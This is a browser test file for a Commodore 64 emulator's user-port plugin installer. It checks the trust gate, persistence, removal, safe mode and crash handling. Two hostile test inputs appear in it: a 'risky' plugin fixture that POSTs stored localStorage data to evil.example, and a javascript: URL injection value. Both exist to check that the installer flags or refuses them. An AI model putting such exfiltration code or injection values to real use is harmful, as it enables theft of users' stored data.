// The User Port card (src/userport/card.js) and the installed-device store
// (src/userport/store.js) in a real browser: the app on its own Vite dev
// server, driven by headless Chromium. Install with the trust gate, replace,
// export, remove, persistence in IndexedDB across a reload, the switch and
// header, a crashing device staying off, the relay field, safe mode, and
// POWER OFF unplugging the device.
//
// Needs Playwright's Chromium (npx playwright install chromium). Without it the
// file reports a SKIP. The checks that power the machine on need the ROMs.
// --catalog runs the switch and plugin chooser checks without the modem checks.

import fs from 'node:fs';
import net from 'node:net';
import { fileURLToPath } from 'node:url';
import { readAsset } from '../external-assets.js';

let chromium;
try { ({ chromium } = await import('playwright')); } catch { /* reported below */ }
let browser = null;
if (chromium) { try { browser = await chromium.launch(); } catch { browser = null; } }
if (!browser) {
  console.log('# SKIP Playwright Chromium is not installed (npx playwright install chromium)');
  process.exit(0);
}

let testNo = 0, failing = 0, current = [];
function expect(cond, msg) { if (!cond) current.push(msg); }
function ok(label) {
  testNo++;
  if (!current.length) console.log(`ok  - test ${testNo}: ${label}`);
  else {
    failing++;
    console.log(`FAIL test ${testNo}: ${label}`);
    for (const m of current) console.log(`     - ${m}`);
    current = [];
  }
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const root = fileURLToPath(new URL('../../', import.meta.url));
const freePort = await new Promise((r) => { const s = net.createServer(); s.listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => r(p)); }); });
// A dev server of its own that leaves public/docs alone, so the docs tests
// running alongside never see files being rewritten.
process.env.VITE_BUILD_DOCS = '0';
const { createServer } = await import('vite');
const vite = await createServer({ root, configFile: `${root}vite.config.js`, logLevel: 'silent', server: { port: freePort, strictPort: true, host: '127.0.0.1' } });
await vite.listen();
const BASE = `http://127.0.0.1:${freePort}`;
const LED_URL = `${BASE}/userport/led-board.js`;

const roms = {};
const kernal = readAsset('kernal'), basic = readAsset('basic'), chargen = readAsset('chargen');
if (kernal && basic && chargen) {
  roms['c64emu.rom.kernal'] = kernal.toString('base64');
  roms['c64emu.rom.basic'] = basic.toString('base64');
  roms['c64emu.rom.charRom'] = chargen.toString('base64');
}
const haveRoms = Object.keys(roms).length === 3;

async function newPage(prefs = {}, url = BASE) {
  const ctx = await browser.newContext({ viewport: { width: 1460, height: 1180 } });
  await ctx.addInitScript(({ roms, prefs }) => {
    if (sessionStorage.getItem('seeded')) return;      // only on the first load, so reloads keep what the page saved
    sessionStorage.setItem('seeded', '1');
    localStorage.setItem('c64emu.panelHidden', '[]');
    for (const [k, v] of Object.entries({ ...roms, ...prefs })) localStorage.setItem(k, v);
    localStorage.setItem('c64emu.splashSeen', '1'); localStorage.setItem('c64emu.themePickerShown', '1');
    localStorage.setItem('c64emu.installDismissed', '1');
  }, { roms, prefs });
  const page = await ctx.newPage();
  await page.goto(url, { waitUntil: 'networkidle' });
  try { if (await page.locator('#setup-modal:not([hidden])').isVisible()) await page.click('#btn-setup-later'); } catch { /* no dialog */ }
  return { ctx, page };
}
const state = (page) => page.evaluate(() => ({
  expanded: document.getElementById('userport-card').classList.contains('expanded'),
  on: document.getElementById('userport-power').checked,
  disabled: document.getElementById('userport-power').disabled,
  device: document.getElementById('userport-device').value,
  options: [...document.querySelectorAll('#userport-device option')].map((o) => o.value),
  status: document.getElementById('userport-status').textContent,
}));
async function installFromUrl(page, url, { tick = true } = {}) {
  await page.click('#btn-userport-url');
  await page.selectOption('#userport-plugin-choice', 'custom');
    await page.fill('#userport-plugin-url', url);
  await page.click('#userport-modal-actions .btn:last-child');
  await page.waitForSelector('#userport-modal:not([hidden])');
  const go = page.locator('#userport-modal-actions .btn:last-child');
  const gated = await go.isDisabled();
  if (tick) { await page.click('#userport-install-trust'); await go.click(); await sleep(800); }
  return gated;
}

try {
  // ── Switch and header ───────────────────────────────────────────────────
  {
    const { ctx, page } = await newPage({ 'c64emu.userport': 'off' });
    const s0 = await state(page);
    await page.click('#userport-card .panel-card-header h2');
    const s1 = await state(page);
    await page.click('#userport-card .panel-card-header h2');
    const s2 = await state(page);
    expect(!s0.on && !s0.expanded, 'starts off and closed');
    expect(s1.on && s1.expanded, 'the header switches it on and opens it');
    expect(!s2.on && !s2.expanded, 'and off and closed again');
    expect(s0.options.includes('builtin.wifi-modem'), 'the built-in modem is listed');
    expect(await page.evaluate(() => localStorage.getItem('c64emu.userport')) === 'off', 'the switch is remembered');
    await ctx.close();
    ok('the switch and the header plug the device in and open the card, like drive 9 and the REU');
  }

  {
    const { ctx, page } = await newPage({ 'c64emu.userport': 'on' });
    expect(!(await state(page)).options.includes('c64ready.printer'), 'the user port has no supplied printer');
    await page.click('#btn-userport-url');
    const choices = await page.locator('#userport-plugin-choice option').allTextContents();
    const fieldBounds = await page.locator('#userport-plugin-choice').evaluate(el => {
      const field = el.getBoundingClientRect(), body = el.closest('.userport-modal-body').getBoundingClientRect();
      const style = getComputedStyle(el);
      return field.left >= body.left && field.right <= body.right + 1 && field.height >= 40 && style.appearance === 'none'
        && parseFloat(style.outlineOffset) <= -parseFloat(style.outlineWidth);
    });
    expect(fieldBounds, 'the native dropdown has an unclipped text box inside the dialog');
    expect(!choices.some(v => v.includes('Hayes Modem')) && !choices.some(v => v.includes('Printer')) && choices.includes('LED board') && choices.includes('Custom URL'), 'the installer offers plugins and Custom URL without the included modem');
    await page.selectOption('#userport-plugin-choice', 'custom');
    await page.fill('#userport-plugin-url', 'javascript:window.catalogInjection=true');
    await page.click('#userport-modal-actions .btn:last-child');
    expect(await page.evaluate(() => document.querySelector('#userport-plugin-url').validationMessage.length > 0 && !window.catalogInjection), 'custom addresses must use HTTP or HTTPS');
    await page.selectOption('#userport-plugin-choice', 'led-board');
    await page.click('#userport-modal-actions .btn:last-child');
    await page.locator('#userport-install-trust').waitFor();
    const checkboxLayout = await page.locator('.userport-consent').evaluate(label => {
      const box = label.querySelector('input').getBoundingClientRect();
      const range = document.createRange(); range.selectNode(label.lastChild);
      const text = range.getBoundingClientRect();
      return box.right <= text.left && Math.abs((box.top + box.bottom - text.top - text.bottom) / 2) < 3;
    });
    expect(checkboxLayout, 'the trust checkbox is beside its text on the same line');
    expect(await page.locator('#userport-modal-actions .btn:last-child').isDisabled(), 'the LED board waits for the install trust gate');
    await page.check('#userport-install-trust');
    await page.click('#userport-modal-actions .btn:last-child');
    await page.waitForFunction(() => document.querySelector('#userport-device').value === 'example.led-board');
    expect((await state(page)).device === 'example.led-board', 'installation adds and selects the LED board');
    await page.reload({ waitUntil: 'networkidle' });
    await page.waitForFunction(() => document.querySelector('#userport-device').value === 'example.led-board');
    expect((await state(page)).device === 'example.led-board', 'the selected LED board survives reload');
    await page.click('#btn-userport-url');
    await page.selectOption('#userport-plugin-choice', 'led-board');
    await page.click('#userport-modal-actions .btn:last-child');
    await page.locator('#userport-install-trust').waitFor();
    expect(await page.locator('#userport-modal-actions .btn:last-child').isDisabled(), 'the ready-made LED board still uses the install trust gate');
    await ctx.close();
    ok('Install from URL offers ready-made plugins and validates a custom URL');
  }

  if (!process.argv.includes('--catalog')) {
  // ── Installing, the trust gate, persistence, replace, export, remove ───
  {
    const { ctx, page } = await newPage({ 'c64emu.userport': 'on' });
    const gated = await installFromUrl(page, LED_URL, { tick: false });
    const warningFirst = await page.evaluate(() => document.querySelector('#userport-modal-body > *')?.classList.contains('userport-warning'));
    expect(gated, 'INSTALL is disabled until the trust box is ticked');
    expect(warningFirst, 'the warning leads the dialog');
    expect(/Nothing risky found/.test(await page.textContent('.userport-findings')), 'the clean LED board shows no findings');
    await page.click('#userport-install-trust');
    expect(!(await page.locator('#userport-modal-actions .btn:last-child').isDisabled()), 'ticking enables it');
    await page.click('#userport-modal-actions .btn:last-child');
    await sleep(800);
    let s = await state(page);
    expect(s.device === 'example.led-board' && s.options.includes('example.led-board'), 'installed, listed and selected');
    ok('install from a URL: the warning comes first and INSTALL waits for the trust box');

    await page.reload({ waitUntil: 'networkidle' });
    await sleep(500);
    s = await state(page);
    expect(s.options.includes('example.led-board') && s.device === 'example.led-board', 'still installed and selected after a reload (IndexedDB)');
    ok('installed devices persist in the browser across a reload');

    await page.click('#btn-userport-url');
    await page.selectOption('#userport-plugin-choice', 'custom');
    await page.fill('#userport-plugin-url', LED_URL);
    await page.click('#userport-modal-actions .btn:last-child');
    await page.waitForSelector('#userport-modal:not([hidden])');
    const title = await page.textContent('#userport-modal-title');
    const label = await page.textContent('#userport-modal-actions .btn:last-child');
    expect(title === 'Replace device' && label === 'REPLACE', `the same id again offers to replace: ${title} / ${label}`);
    await page.click('#btn-userport-modal-x');
    ok('installing the same id again is a replace');

    await page.click('#btn-userport-manage');
    await page.waitForSelector('#userport-modal:not([hidden])');
    const rows = await page.$$eval('.userport-list li .name', (els) => els.map((e) => e.firstChild.textContent));
    expect(rows.some((r) => r.startsWith('Hayes Modem')) && rows.some((r) => r.startsWith('LED board')), `MANAGE lists built-in and installed: ${rows}`);
    const [download] = await Promise.all([
      page.waitForEvent('download'),
      page.locator('.userport-list li', { hasText: 'LED board' }).locator('.btn', { hasText: 'EXPORT' }).click(),
    ]);
    const exported = fs.readFileSync(await download.path(), 'utf8');
    expect(exported === fs.readFileSync(new URL('../../public/userport/led-board.js', import.meta.url), 'utf8'), 'EXPORT gives back the installed file');
    await page.locator('.userport-list li', { hasText: 'LED board' }).locator('.btn', { hasText: 'REMOVE' }).click();
    await sleep(800);
    s = await state(page);
    expect(!s.options.includes('example.led-board') && s.device === 'builtin.wifi-modem', 'REMOVE drops it and falls back to the modem');
    await page.reload({ waitUntil: 'networkidle' });
    await sleep(500);
    expect(!(await state(page)).options.includes('example.led-board'), 'and it stays removed after a reload');
    await ctx.close();
    ok('MANAGE: export returns the file, remove deletes it for good');
  }

  // ── The install check lists what a risky file does ─────────────────────
  {
    const risky = `export const meta = { id: 'example.risky', name: 'Risky', version: '1.0.0', apiVersion: 1 };
export function create() {
  fetch('https://evil.example/collect', { method: 'POST', body: localStorage.getItem('c64emu.rom.kernal') });
  return {};
}`;
    const { ctx, page } = await newPage({ 'c64emu.userport': 'on' });
    const url = `${BASE}/__risky.js`;
    await page.route(url, (r) => r.fulfill({ status: 200, contentType: 'text/javascript', body: risky }));
    await installFromUrl(page, url, { tick: false });
    const items = await page.$$eval('.userport-findings li', (els) => els.map((e) => [e.className, e.textContent]));
    expect(items.some(([c, t]) => c === 'high' && /network/.test(t) && /evil\.example/.test(t)), `network finding with the address: ${JSON.stringify(items)}`);
    expect(items.some(([c, t]) => c === 'high' && /storage/.test(t)), 'storage finding');
    expect(await page.locator('#userport-modal-actions .btn:last-child').isDisabled(), 'still gated on the trust box');
    await page.locator('#userport-modal .userport-modal-card').screenshot({ path: fileURLToPath(new URL('../../investigation/userport-shots/install-findings.png', import.meta.url)) }).catch(() => {});
    await ctx.close();
    ok('the install dialog lists what a risky file does, with the addresses it contacts');
  }

  // ── Not a device ────────────────────────────────────────────────────────
  {
    const { ctx, page } = await newPage({ 'c64emu.userport': 'on' });
    await page.click('#btn-userport-url');
    await page.selectOption('#userport-plugin-choice', 'custom');
    await page.fill('#userport-plugin-url', `${BASE}/userport/userport-device.d.ts`);
    await page.click('#userport-modal-actions .btn:last-child');
    await page.waitForSelector('#userport-modal:not([hidden])');
    expect(await page.textContent('#userport-modal-title') === 'Not a user port device', 'a file that is not a device is refused');
    expect(!(await page.locator('#userport-install-trust').count()), 'with no way to install it');
    await ctx.close();
    ok('a file that is not a device is refused before anything is stored');
  }

  // ── Relay field and safe mode ───────────────────────────────────────────
  {
    if (haveRoms) {
    const { ctx, page } = await newPage({ 'c64emu.userport': 'on' });
    await page.click('#btn-power');
    await page.locator('#userport-relay').waitFor();
    expect((await page.getAttribute('#userport-relay', 'placeholder')).endsWith('/relay'), 'served locally, the placeholder shows the app\'s own relay');
    await page.fill('#userport-relay', 'wss://relay.example/relay');
    const note = await page.textContent('#userport-relay-note');
    expect(/Saved/.test(note) && note.includes('wss://relay.example/relay'), `a pasted relay is saved at once, and says so: "${note}"`);
    await page.reload({ waitUntil: 'networkidle' });
    await page.click('#btn-power');
    await page.locator('#userport-relay').waitFor();
    expect(await page.inputValue('#userport-relay') === 'wss://relay.example/relay', 'the relay address is remembered, with no Enter or Tab');
    await page.fill('#userport-relay', 'relay.example');
    await page.press('#userport-relay', 'Tab');
    const bad = await page.textContent('#userport-relay-note');
    expect(/Not saved/.test(bad) && /ws:\/\//.test(bad), `an address that is not ws:// or wss:// is refused, and says why: "${bad}"`);
    await page.reload({ waitUntil: 'networkidle' });
    await page.click('#btn-power');
    await page.locator('#userport-relay').waitFor();
    expect(await page.inputValue('#userport-relay') === 'wss://relay.example/relay', 'and the saved relay stays');
    await ctx.close();
    } else console.log('ok  - modem relay controls # SKIP no C64 ROMs');
    const safe = await newPage({ 'c64emu.userport': 'on' }, `${BASE}/?USERPORT_SAFE=1`);
    const s = await state(safe.page);
    expect(s.disabled && !s.on && /Safe mode/.test(s.status), `safe mode: switch locked off, status says so (${s.status})`);
    await safe.ctx.close();
    ok('the relay address is saved as it is pasted, says so, refuses a non-ws address, and safe mode loads no device code');
  }

  // ── With the machine on: crash and power off ───────────────────────────
  if (!haveRoms) {
    console.log('ok  - a crashing device stays off, POWER OFF unplugs # SKIP no C64 ROMs');
  } else {
    const crashy = `export const meta = { id: 'example.crashy', name: 'Crashy', version: '1.0.0', apiVersion: 1 };
export function create() { return { onPortB() { throw new Error('crashed on purpose'); } }; }`;
    const srcUrl = `${BASE}/__crashy.js`;
    const { ctx, page } = await newPage({ 'c64emu.userport': 'on' });
    await page.route(srcUrl, (r) => r.fulfill({ status: 200, contentType: 'text/javascript', body: crashy }));
    await page.click('#btn-power');
    await sleep(4500);
    await installFromUrl(page, srcUrl);
    await page.evaluate(() => { window.machine.cia2.write(0x03, 0xff); });
    await sleep(300);
    let s = await state(page);
    expect(!s.on && s.expanded && /crashed on purpose/.test(s.status), `the crash switches the port off and shows why, card open: ${s.status}`);
    expect(await page.evaluate(() => localStorage.getItem('c64emu.userport')) === 'off', 'and it stays off after a reload');
    expect(await page.evaluate(() => window.machine.userport === null && window.machine.cia2.readPortB == null && window.machine.cia1.serialPinsChanged == null), 'a failed device removes the user port and its CIA hooks');
    ok('a crashing device is unplugged, the C64 runs on, and it stays off');

    await page.selectOption('#userport-device', 'builtin.wifi-modem');
    await page.check('#userport-power').catch(() => page.click('#userport-power-switch'));
    await sleep(800);
    s = await state(page);
    expect(s.on && /Ready/.test(s.status), `the modem plugs in: ${s.status}`);
    const speaker = page.locator('#userport-panel button[aria-label="Modem speaker"]');
    await speaker.waitFor();
    expect(await speaker.getAttribute('aria-pressed') === 'false', 'the modem speaker starts off');
    expect(await speaker.evaluate(el => el.innerHTML === document.querySelector('#btn-tape-listen').innerHTML), 'the modem reuses the exact Datasette speaker glyphs');
    expect(await page.locator('#userport-device option:checked').innerText() === 'Hayes Modem', 'the selector shows the Hayes Modem name');
    await speaker.click();
    expect(await speaker.getAttribute('aria-pressed') === 'true', 'the speaker button enables sound');
    expect(await page.evaluate(() => JSON.parse(localStorage.getItem('c64emu.userport.dev.builtin.wifi-modem.speaker'))) === true, 'the speaker preference is stored under the existing device identity');
    await page.click('#btn-power');
    await sleep(800);
    s = await state(page);
    expect(/Waiting for the C64/.test(s.status), `POWER OFF: the card says the C64 is off (${s.status})`);
    await page.click('#btn-power');
    await sleep(4500);
    s = await state(page);
    expect(/Ready/.test(s.status) && await page.evaluate(() => window.machine.userport?.deviceId === 'builtin.wifi-modem'), 'POWER ON plugs it back in');
    expect(await speaker.getAttribute('aria-pressed') === 'true', 'the speaker choice survives power cycling');
    await page.click('#userport-power-switch');
    await page.waitForFunction(() => window.machine.userport === null);
    expect(await page.evaluate(() => window.machine.cia2.readPortB == null && window.machine.cia2.pcStrobe == null && window.machine.cia1.serialPinsChanged == null && window.machine.cia2.serialPinsChanged == null), 'the off switch removes user port bus and serial hooks');
    await page.click('#btn-reset');
    await page.waitForFunction(() => window.machine?.ready && window.machine.userport === null);
    await page.click('#btn-power'); await page.click('#btn-power');
    await page.waitForFunction(() => window.machine?.ready && window.machine.userport === null);
    await page.reload({ waitUntil: 'networkidle' }); await page.click('#btn-power');
    await page.waitForFunction(() => window.machine?.ready && window.machine.userport === null);
    expect(!(await page.locator('#userport-power').isChecked()), 'the user port stays unwired after reset, power cycling and reload while switched off');
    await ctx.close();
    ok('POWER OFF unplugs the device and POWER ON plugs it back');
  }
  // Render the real effect graph offline, with no speaker or network access.
  {
    const { ctx, page } = await newPage();
    const results = await page.evaluate(async () => {
      const { create } = await import('/src/userport/devices/modem.js');
      async function render(muted, unplugged) {
        const offline = new OfflineAudioContext(1, 62400, 48000);
        const master = offline.createGain(); master.gain.value = muted ? 0 : 1;
        master.connect(offline.destination);
        const audio = { state: 'running', currentTime: 0, sampleRate: offline.sampleRate,
          createBuffer: (...args) => offline.createBuffer(...args), createBufferSource: () => offline.createBufferSource(),
          createGain: () => offline.createGain(), createBiquadFilter: () => offline.createBiquadFilter(),
          createOscillator: () => offline.createOscillator() };
        let clock = 0, wake = Infinity, pa2 = 1, frame, socket;
        const port = { cyclesPerSecond: 985248, now: () => clock, c64PB: () => 255,
          c64PA2: () => pa2, c64Serial: () => 15, drivePB() {}, driveSerial() {}, setFlag() {},
          wakeAt: cycle => { wake = cycle > clock ? Math.floor(cycle) : clock + 1; }, cancelWake: () => { wake = Infinity; } };
        const dev = create(port, { panel: null, audio: () => ({ context: audio, destination: master }),
          storage: { get: key => key === 'speaker' ? true : null }, onFrame: fn => { frame = fn; },
          openSocket: () => (socket = { send() {}, close() {} }) });
        const advance = to => { while (wake <= to) { clock = wake; wake = Infinity; dev.onTimer(clock); } clock = to; };
        for (const char of 'ATD"echo"\r') {
          const byte = char.charCodeAt(0), bit = 985248 / 1200, start = clock;
          const levels = [0, ...Array.from({ length: 8 }, (_, i) => (byte >> i) & 1), 1];
          for (let i = 0; i < levels.length; i++) {
            advance(Math.round(start + i * bit));
            if (pa2 !== levels[i]) { pa2 = levels[i]; dev.onPA2(pa2); }
          }
          advance(Math.round(start + bit * 10) + 1);
        }
        frame(); socket.onopen(); frame();
        if (unplugged) dev.detach();
        const buffer = await offline.startRendering();
        let energy = 0;
        for (const value of buffer.getChannelData(0)) energy += value * value;
        dev.detach();
        return Math.sqrt(energy / buffer.length);
      }
      return { audible: await render(false, false), muted: await render(true, false), unplugged: await render(false, true) };
    });
    expect(results.audible > 0.001, `the speaker renders an audible waveform (${results.audible})`);
    expect(results.muted === 0, 'master mute silences the actual waveform');
    expect(results.unplugged === 0, 'unplugging disconnects every source before it can sound');
    await ctx.close();
    ok('modem speaker synthesis, master mute and unplugging work through real WebAudio');
  }
  }
} finally {
  await browser.close();
  await vite.close();
}

console.log(failing ? `\n${failing} of ${testNo} FAILED` : `\nall ${testNo} passed`);
process.exit(failing ? 1 : 0);
